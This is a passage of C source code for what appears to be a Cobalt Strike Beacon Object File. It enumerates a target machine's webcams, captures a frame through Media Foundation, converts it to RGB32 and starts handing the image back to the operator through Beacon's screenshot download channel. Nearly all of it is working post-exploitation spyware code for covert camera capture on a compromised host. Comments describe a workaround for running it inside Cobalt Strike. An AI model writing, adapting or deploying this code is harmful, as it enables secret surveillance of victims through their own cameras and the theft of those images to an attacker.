    { s_MFVideoFormat_RGB24, TransformImage_RGB24 },
    { s_MFVideoFormat_YUY2,  TransformImage_YUY2  },
    { s_MFVideoFormat_NV12,  TransformImage_NV12  }
};

// Hacky function to fix a truncated pointer assuming it is a 32-bit offset from the module base.
/*
If anyone sees this, you may ask yourself: 

What the hell is this function for?

When running this BOF in COFFLoader, all would work well.

[DEBUG] Conversion function: 00007ff49c300061, width: 1920, height: 1080

However, when running in Cobalt Strike,

[+] received output:
[DEBUG] Conversion function: 0000000000000061, width: 1920, height: 1080

for whatever reason, the front bytes of the address get truncated. Why? God knows. Honestly im not even sure
if he knows. Maybe he does. I hope he does.

Anyways, last 4 bytes are clean. Great! I'll just resolve the address of go() and pull the module base from there, then
combine it with the last 4 bytes to get the CORRECT address!

Yes. This worked. Should anyone else ever do this again? I hope not.

Whatever it works.

~ CodeX

*/
IMAGE_TRANSFORM_FN FixTruncatedXform(IMAGE_TRANSFORM_FN truncated)
{
    // Use the address of go as our reference for a good high-order part.
    uintptr_t goodHigh = ((uintptr_t)go) & 0xFFFFFFFFFFFF0000ull;
    uintptr_t low = ((uintptr_t)truncated) & 0xFFFFull;
    uintptr_t fixed = goodHigh | low;
    
    // BeaconPrintf(CALLBACK_OUTPUT,
    //     "\n[DEBUG] FixTruncatedXform: goodHigh = 0x%Ix, low = 0x%Ix, fixed pointer = %p\n",
    //     goodHigh, low, (void*)fixed);
    
    return (IMAGE_TRANSFORM_FN)fixed;
}

HRESULT CColorConverter_SetConversionFunction(CColorConverter* cc, const GUID* subtype) {
    if (!cc || !subtype) {
        BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] Null pointer passed to CColorConverter_SetConversionFunction.");
        return E_POINTER;
    }

    cc->m_convertFn = NULL;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting conversion function for subtype: {%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}",subtype->Data1, subtype->Data2, subtype->Data3,subtype->Data4[0], subtype->Data4[1], subtype->Data4[2], subtype->Data4[3],subtype->Data4[4], subtype->Data4[5], subtype->Data4[6], subtype->Data4[7]);

    DWORD i;
    for (i = 0; i < (DWORD)(sizeof(s_FormatConversions) / sizeof(s_FormatConversions[0])); i++) {
        // //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Checking against format: {%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}",
        //     s_FormatConversions[i].subtype.Data1, s_FormatConversions[i].subtype.Data2, s_FormatConversions[i].subtype.Data3,
        //     s_FormatConversions[i].subtype.Data4[0], s_FormatConversions[i].subtype.Data4[1], s_FormatConversions[i].subtype.Data4[2], s_FormatConversions[i].subtype.Data4[3],
        //     s_FormatConversions[i].subtype.Data4[4], s_FormatConversions[i].subtype.Data4[5], s_FormatConversions[i].subtype.Data4[6], s_FormatConversions[i].subtype.Data4[7]);

        if (IsEqualGUID(&s_FormatConversions[i].subtype, subtype)) {
            cc->m_convertFn = s_FormatConversions[i].xform;
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Raw conversion function pointer: %p\n", cc->m_convertFn);
            cc->m_convertFn = FixTruncatedXform(cc->m_convertFn);
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Conversion function fixed to: %p\n", cc->m_convertFn);
            return S_OK;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] No matching format found for the given subtype.");
    return MF_E_INVALIDMEDIATYPE;
}

void CColorConverter_ConvertImageToRGB32(
    CColorConverter* cc,
    BYTE* pDest,
    LONG destStride,
    IMFMediaBuffer* buf
)
{
    // 1. Validate parameters
    if (!cc || !pDest || !buf) {
        BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] Invalid parameters: cc=%p, pDest=%p, buf=%p\n", cc, pDest, buf);
        return;
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Entering CColorConverter_ConvertImageToRGB32\n");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Parameters - cc: %p, pDest: %p, destStride: %d, buf: %p\n", cc, pDest, destStride, buf);

    BYTE* pbScanline0 = NULL;
    LONG lStride = 0;

    // 2. Initialize the VideoBufferLock helper
    VideoBufferLock vb;
    VideoBufferLock_Init(&vb, buf);
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] VideoBufferLock initialized\n");

    // 3. Attempt to lock the buffer
    HRESULT hr = VideoBufferLock_LockBuffer(
        &vb,
        cc->m_lDefaultStride,
        cc->m_height,
        &pbScanline0,
        &lStride
    );

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] LockBuffer returned hr: 0x%08X, pbScanline0: %p, lStride: %d\n", hr, pbScanline0, lStride);

    // 4. If lock succeeded, and we got a valid pointer, call the conversion function
    if (SUCCEEDED(hr) && pbScanline0 != NULL)
    {
        if (cc->m_convertFn) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Calling conversion function\n");
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Conversion function: %p, width: %d, height: %d\n", cc->m_convertFn, cc->m_width, cc->m_height);
            
            // Convert from the webcam’s native format to RGB32
            cc->m_convertFn(
                pDest,
                destStride,
                pbScanline0,
                lStride,
                cc->m_width,
                cc->m_height
            );

            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Image conversion to RGB32 complete\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] No conversion function set!\n");
        }
    } else {
        // Locking the buffer failed or returned a NULL pointer
        BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] LockBuffer failed: hr=0x%08X, pbScanline0=%p\n", hr, pbScanline0);
    }

    // 5. Always clean up (unlock) the buffer
    VideoBufferLock_Cleanup(&vb);
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] VideoBufferLock cleanup complete, exiting function\n");
}


int CColorConverter_IsFormatSupported(CColorConverter* cc, const GUID* subtype) {
    DWORD i;
    for (i = 0; i < (DWORD)(sizeof(s_FormatConversions) / sizeof(s_FormatConversions[0])); i++) {
        if (IsEqualGUID(&s_FormatConversions[i].subtype, subtype))
            return 1;
    }
    return 0;
}

HRESULT CColorConverter_GetFormat(CColorConverter* cc, DWORD index, GUID* pSubtype) {
    if (index < (DWORD)(sizeof(s_FormatConversions) / sizeof(s_FormatConversions[0]))) {
        *pSubtype = s_FormatConversions[index].subtype;
        return S_OK;
    }
    return MF_E_NO_MORE_TYPES;
}

HRESULT CColorConverter_GetDefaultStride(CColorConverter* cc, IMFMediaType* pType, LONG* plStride) {
    LONG lStride = 0;
    HRESULT hr = S_OK;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_GetDefaultStride() called");

    // Attempt to get the default stride directly
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving default stride (MF_MT_DEFAULT_STRIDE)");
    hr = pType->lpVtbl->GetUINT32(pType, &MF_MT_DEFAULT_STRIDE, (UINT32*)&lStride);
    if (FAILED(hr)) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride not set, calculating manually");

        GUID subtype = {0};
        UINT32 width = 0, height = 0;

        // Get video subtype
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving video subtype (MF_MT_SUBTYPE)");
        hr = pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &subtype);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to get video subtype (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Video subtype retrieved successfully");

        // Get frame size
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving frame size (MF_MT_FRAME_SIZE)");
        hr = MFGetAttributeSize((IMFAttributes*)pType, &MF_MT_FRAME_SIZE, &width, &height);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to get frame size (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Frame size retrieved: width=%u, height=%u", width, height);

        // Get stride for the given format
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Calculating stride for format");
        hr = pMFGetStrideForBitmapInfoHeader(&subtype, width, &lStride);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to get stride for format (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Calculated stride: %ld", lStride);

        // Store the calculated stride in the media type
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Storing calculated stride in media type");
        hr = pType->lpVtbl->SetUINT32(pType, &MF_MT_DEFAULT_STRIDE, (UINT32)lStride);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to set default stride (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride stored successfully");
    } else {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride retrieved successfully: %ld", lStride);
    }

    *plStride = lStride;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_GetDefaultStride() completed with HRESULT: 0x%08X", hr);
    return hr;
}



HRESULT CColorConverter_SetVideoType(CColorConverter* cc, IMFMediaType* pType)
{
    HRESULT hr = S_OK;
    GUID subtype = {0};
    UINT32 num = 0, den = 0;
    UINT32 interlace = 0;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_SetVideoType() called");

    // Get the video subtype.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving video subtype (MF_MT_SUBTYPE)");
    hr = pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &subtype);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get MF_MT_SUBTYPE (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Video subtype retrieved successfully");

    // Choose a conversion function.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting conversion function for subtype");
    hr = CColorConverter_SetConversionFunction(cc, &subtype);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set conversion function (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Conversion function set successfully");

    // Get the frame size.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving frame size (MF_MT_FRAME_SIZE)");
    hr = MFGetAttributeSize((IMFAttributes*)pType, &MF_MT_FRAME_SIZE, &cc->m_width, &cc->m_height);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get frame size (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Frame size retrieved: width=%u, height=%u", cc->m_width, cc->m_height);

    // Get the interlace mode; default is progressive.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving interlace mode (MF_MT_INTERLACE_MODE)");
    hr = MFGetAttributeUINT32((IMFAttributes*)pType, &MF_MT_INTERLACE_MODE, &interlace);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get interlace mode (HRESULT: 0x%08X). Defaulting to MFVideoInterlace_Progressive", hr);
        cc->m_interlace = MFVideoInterlace_Progressive;
    }
    else
    {
        cc->m_interlace = (MFVideoInterlaceMode)interlace;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Interlace mode set to %u", cc->m_interlace);

    // Get the default stride.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Getting default stride");
    hr = CColorConverter_GetDefaultStride(cc, pType, &cc->m_lDefaultStride);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get default stride (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride: %ld", cc->m_lDefaultStride);

    // Get the pixel aspect ratio. Default to 1:1 if not available.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving pixel aspect ratio (MF_MT_PIXEL_ASPECT_RATIO)");
    hr = MFGetAttributeRatio((IMFAttributes*)pType, &MF_MT_PIXEL_ASPECT_RATIO, &num, &den);
    if (SUCCEEDED(hr))
    {
        cc->m_PixelAR.Numerator = num;
        cc->m_PixelAR.Denominator = den;
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Pixel aspect ratio retrieved: %u:%u", num, den);
    }
    else
    {
        cc->m_PixelAR.Numerator = cc->m_PixelAR.Denominator = 1;
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get pixel aspect ratio (HRESULT: 0x%08X). Defaulting to 1:1", hr);
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_SetVideoType() completed with HRESULT: 0x%08X", hr);
    return hr;
}


/* WebcamAccess */
typedef struct _ChooseDeviceParam {
    IMFActivate** ppDevices;
    UINT32 count;
    UINT32 selection;
} ChooseDeviceParam;

typedef struct _CWebcamAccess {
    ChooseDeviceParam m_cam_devices;
    IMFSourceReader* m_pReader;
    CColorConverter m_color_converter;
    BOOL m_ready;
} CWebcamAccess;

void CWebcamAccess_Init(CWebcamAccess* wa) {
    ZeroMemory(&wa->m_cam_devices, sizeof(wa->m_cam_devices));
    wa->m_pReader = NULL;
    CColorConverter_Init(&wa->m_color_converter);
    wa->m_ready = FALSE;
}

void CWebcamAccess_CloseDevice(CWebcamAccess* wa) {
    if (wa->m_pReader)
        SAFE_RELEASE(wa->m_pReader);
    wa->m_ready = FALSE;
}

void CWebcamAccess_Destroy(CWebcamAccess* wa) {
    CWebcamAccess_CloseDevice(wa);
    for (DWORD i = 0; i < wa->m_cam_devices.count; i++) {
        SAFE_RELEASE(wa->m_cam_devices.ppDevices[i]);
    }
    pCoTaskMemFree(wa->m_cam_devices.ppDevices);
}

HRESULT CWebcamAccess_BuildListOfDevices(CWebcamAccess* wa)
{
    HRESULT hr = S_OK;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_BuildListOfDevices() called");

    // Zero out the device list structure.
    ZeroMemory(&wa->m_cam_devices, sizeof(wa->m_cam_devices));
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Zeroed m_cam_devices structure");

    IMFAttributes* pAttributes = NULL;

    // Use the function pointer to create the attribute store.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Creating attribute store with pMFCreateAttributes");
    hr = pMFCreateAttributes(&pAttributes, 1);
    if (SUCCEEDED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Attribute store created successfully");

        // Set the attribute to specify that we want video capture devices.
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting attribute MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE");
        hr = pAttributes->lpVtbl->SetGUID(
            pAttributes,
            &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
            &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID
        );

        if (SUCCEEDED(hr))
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Attribute set successfully");

            // Enumerate the video capture devices.
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Enumerating video capture devices with pMFEnumDeviceSources");
            hr = pMFEnumDeviceSources(pAttributes,
                                      &wa->m_cam_devices.ppDevices,
                                      &wa->m_cam_devices.count);
            if (SUCCEEDED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully enumerated %u video capture devices", wa->m_cam_devices.count);

                // Iterate through each device and print its friendly name.
                for (UINT i = 0; i < wa->m_cam_devices.count; i++)
                {
                    WCHAR* szFriendlyName = NULL;
                    UINT32 cchName = 0;
                    HRESULT hrName = wa->m_cam_devices.ppDevices[i]->lpVtbl->GetAllocatedString(
                        wa->m_cam_devices.ppDevices[i],
                        &MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
                        &szFriendlyName,
                        &cchName
                    );
                    if (SUCCEEDED(hrName))
                    {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Using device %u: %ls", i, szFriendlyName);
                        pCoTaskMemFree(szFriendlyName);
                    }
                    else
                    {
                        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to retrieve friendly name for device %u (HRESULT: 0x%08X)", i, hrName);
                    }
                }
            }
            else
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to enumerate video capture devices (HRESULT: 0x%08X)", hr);
            }
        }
        else
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set attribute (HRESULT: 0x%08X)", hr);
        }
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to create attribute store (HRESULT: 0x%08X)", hr);
    }

    // Release the attribute store.
    if (pAttributes)
    {
        pAttributes->lpVtbl->Release(pAttributes);
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Released attribute store");
    }

    return hr;
}


HRESULT CWebcamAccess_Initialize(CWebcamAccess* wa)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_Initialize() called");

    HRESULT hr = CWebcamAccess_BuildListOfDevices(wa);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT,"\n[DEBUG] Failed to build list of webcam devices (HRESULT: 0x%08X)",hr);
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully built list of webcam devices");
    }

    //BeaconPrintf(CALLBACK_OUTPUT,"\n[DEBUG] CWebcamAccess_Initialize() completed with HRESULT: 0x%08X",hr);
    return hr;
}


int CWebcamAccess_SetDeviceIndex(CWebcamAccess* wa, unsigned int index) {
    if (index < wa->m_cam_devices.count) {
        wa->m_cam_devices.selection = index;
        return 1;
    }
    return 0;
}

HRESULT CWebcamAccess_TryMediaType(CWebcamAccess* wa, IMFMediaType* pType)
{
    HRESULT hr = S_OK;
    BOOL bFound = FALSE;
    GUID subtype = {0};

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_TryMediaType() called");

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Getting GUID for MF_MT_SUBTYPE");
    hr = pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &subtype);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get MF_MT_SUBTYPE (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieved subtype GUID");

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Checking if color converter supports format directly");
    if (CColorConverter_IsFormatSupported(&wa->m_color_converter, &subtype))
    {
        bFound = TRUE;
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Directly supported format found");
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Direct format not supported, attempting conversion formats");
        DWORD i = 0;
        for (;; i++)
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Getting conversion format at index %u", i);
            hr = CColorConverter_GetFormat(&wa->m_color_converter, i, &subtype);
            if (FAILED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] No more conversion formats available or error occurred at index %u (HRESULT: 0x%08X)", i, hr);
                break;
            }
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting MF_MT_SUBTYPE with conversion format at index %u", i);
            hr = pType->lpVtbl->SetGUID(pType, &MF_MT_SUBTYPE, &subtype);
            if (FAILED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set MF_MT_SUBTYPE for conversion format index %u (HRESULT: 0x%08X)", i, hr);
                break;
            }
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting current media type on source reader with conversion format at index %u", i);
            hr = wa->m_pReader->lpVtbl->SetCurrentMediaType(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
            if (SUCCEEDED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully set current media type with conversion format at index %u", i);
                bFound = TRUE;
                break;
            }
        }
    }

    if (bFound)
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Suitable media type found, updating video type in color converter");
        hr = CColorConverter_SetVideoType(&wa->m_color_converter, pType);
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] No suitable media type found");
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_TryMediaType() completed with HRESULT: 0x%08X", hr);
    return hr;
}


HRESULT CWebcamAccess_PrepareDevice(CWebcamAccess* wa)
{
    HRESULT hr = S_OK;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_PrepareDevice() called");
    BeaconPrintf(CALLBACK_OUTPUT,"\n[*] %d webcams detected",wa->m_cam_devices.count);
    if(wa->m_cam_devices.count == 0){
        BeaconPrintf(CALLBACK_ERROR,"No webcams detected");
        return -1;
    }
    if (wa->m_cam_devices.selection >= wa->m_cam_devices.count)
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Invalid camera selection: %u (count: %u)",wa->m_cam_devices.selection, wa->m_cam_devices.count);
        return E_FAIL;
    }


    IMFMediaSource* pSource = NULL;
    IMFAttributes* pAttributes = NULL;
    IMFMediaType* pType = NULL;
    // Get the selected device
    IMFActivate* pActivate = wa->m_cam_devices.ppDevices[wa->m_cam_devices.selection];

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Closing any existing webcam device");
    // Call the CloseDevice function via its function pointer
    CWebcamAccess_CloseDevice(wa);

    wa->m_ready = TRUE;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Activating camera device");

    // Use the function pointer to activate the media source.
    hr = pActivate->lpVtbl->ActivateObject(pActivate, &IID_IMFMediaSource, (void**)&pSource);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to activate camera device (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Camera device activated successfully");

    hr = pMFCreateAttributes(&pAttributes, 2);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to create media attributes (HRESULT: 0x%08X)", hr);
        goto cleanup;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Media attributes created successfully");


    hr = pAttributes->lpVtbl->SetUINT32(pAttributes, &MF_READWRITE_DISABLE_CONVERTERS, TRUE);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set attribute MF_READWRITE_DISABLE_CONVERTERS (HRESULT: 0x%08X)", hr);
        goto cleanup;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Set attribute MF_READWRITE_DISABLE_CONVERTERS to TRUE");

    hr = pMFCreateSourceReaderFromMediaSource(pSource, pAttributes, &wa->m_pReader);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to create media source reader (HRESULT: 0x%08X)", hr);
        goto cleanup;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Media source reader created successfully");

    DWORD i = 0;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Enumerating native media types");
    for (;; i++)
    {
        hr = wa->m_pReader->lpVtbl->GetNativeMediaType(wa->m_pReader,
                                                       (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                                                       i,
                                                       &pType);
        if (FAILED(hr))
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] No more media types available (HRESULT: 0x%08X)", hr);
            break;
        }

        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Trying media type index: %u", i);
 
        hr = CWebcamAccess_TryMediaType(wa, pType);
        SAFE_RELEASE(pType);

        if (SUCCEEDED(hr))
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Suitable media type found at index %u", i);
            break;
        }
    }

cleanup:
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "\nPreparing device failed, cleaning up");
        if (pSource)
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Shutting down media source");
            pSource->lpVtbl->Shutdown(pSource);
        }
        // Use the function pointer to close the device.
        CWebcamAccess_CloseDevice(wa);
    }

    SAFE_RELEASE(pSource);
    SAFE_RELEASE(pAttributes);
    SAFE_RELEASE(pType);

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_PrepareDevice() completed with HRESULT: 0x%08X", hr);
    return hr;
}




void CWebcamAccess_GetImageSizes(CWebcamAccess* wa, unsigned int* width, unsigned int* height) {
    *width = wa->m_color_converter.m_width;
    *height = wa->m_color_converter.m_height;
}

HRESULT CWebcamAccess_GetImageData(CWebcamAccess* wa, BYTE* buffer, LONG stride) {
    if (!wa->m_ready) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Webcam not ready, returning S_FALSE\n");
        return S_FALSE;
    }

    IMFSample* videoSample = NULL;
    DWORD streamIndex, flags;
    LONGLONG llVideoTimeStamp, llSampleDuration;
    HRESULT hr = S_OK;
    int samplesRead = 0;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Entering image capture loop\n");

    while (!samplesRead) {
        hr = wa->m_pReader->lpVtbl->ReadSample(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0,
                                               &streamIndex, &flags, &llVideoTimeStamp, &videoSample);

        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] ReadSample failed with HRESULT: 0x%08lx\n", hr);
            break;
        }

        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] ReadSample succeeded, streamIndex: %u, flags: 0x%08x, timestamp: %lld\n",streamIndex, flags, llVideoTimeStamp);

        if (flags & MF_SOURCE_READERF_STREAMTICK) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] StreamTick flag detected, continuing loop\n");
            continue;
        }

        if (videoSample) {
            samplesRead++;
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Video sample acquired\n");

            hr = videoSample->lpVtbl->SetSampleTime(videoSample, llVideoTimeStamp);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] SetSampleTime failed: 0x%08lx\n", hr);
            }
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] SetSampleTime success: 0x%08lx\n", hr);

            hr = videoSample->lpVtbl->GetSampleDuration(videoSample, &llSampleDuration);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] GetSampleDuration failed: 0x%08lx\n", hr);
            } else {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Sample duration: %lld\n", llSampleDuration);
            }

            IMFMediaBuffer* buf = NULL;
            hr = videoSample->lpVtbl->ConvertToContiguousBuffer(videoSample, &buf);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] ConvertToContiguousBuffer failed: 0x%08lx\n", hr);
            } else {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully converted sample to contiguous buffer\n");
                //BeaconPrintf(CALLBACK_OUTPUT,"\n[DEBUG] Calling CColorConverter_ConvertImageToRGB32 with cc: %p, buffer: %p, stride: %ld, buf: %p\n",&wa->m_color_converter, buffer, stride, buf);
                CColorConverter_ConvertImageToRGB32(&wa->m_color_converter, buffer, stride, buf);

                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Image conversion to RGB32 complete\n");

                buf->lpVtbl->Unlock(buf);
                SAFE_RELEASE(buf);
            }

            SAFE_RELEASE(videoSample);
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Released video sample\n");
        }
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Exiting image capture loop with HRESULT: 0x%08lx\n", hr);
    return hr;
}


/*Download Screenshot*/
void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
// Function modified by @BinaryFaultline

// This data helped me figure out the C code to download a screenshot. It was found in the BOF.NET code here: https://github.com/CCob/BOF.NET/blob/2da573a4a2a760b00e66cd051043aebb2cfd3182/managed/BOFNET/BeaconObject.cs
// Special thanks to CCob doing the research around the BeaconOutput options, making this much easier for me.

// private void WriteSessionUserNameTitle(BinaryWriter bw, int session, string userName, string title) {
//             bw.Write(session);
//             bw.Write(title.Length);
//             bw.Write(Encoding.UTF8.GetBytes(title));
